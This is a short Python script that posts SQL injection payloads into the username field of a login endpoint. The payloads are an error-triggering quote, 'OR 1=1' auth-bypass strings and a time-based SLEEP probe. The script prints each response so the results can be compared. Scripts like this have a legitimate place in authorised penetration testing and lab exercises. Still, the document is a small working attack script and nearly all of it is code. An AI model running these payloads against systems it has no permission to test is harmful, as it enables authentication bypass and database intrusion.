import requests

def detect_sqli(url):
    for payload in [
        # Those are the tests
        "'", # this should trigger an error
        "' OR 1=1 -- ", # this maybe bypasses the auth?
        "' OR 1=2 -- ",
        "' OR IF(1=1, SLEEP(5), 0) -- " # this triggers a time delay
    ]:
        response = requests.post(url, data={"username": payload, "password": "password"})
        print(f"Payload: {payload} => Status: {response.status_code}, Length: {len(response.text)}")
        print(f"Text: {response.text}") # check for differences in responses
        print('=====================================================================================')

if __name__ == "__main__":
    url = "" # put the url here => for example: https://IP:PORT/api/auth/login
    detect_sqli(url)

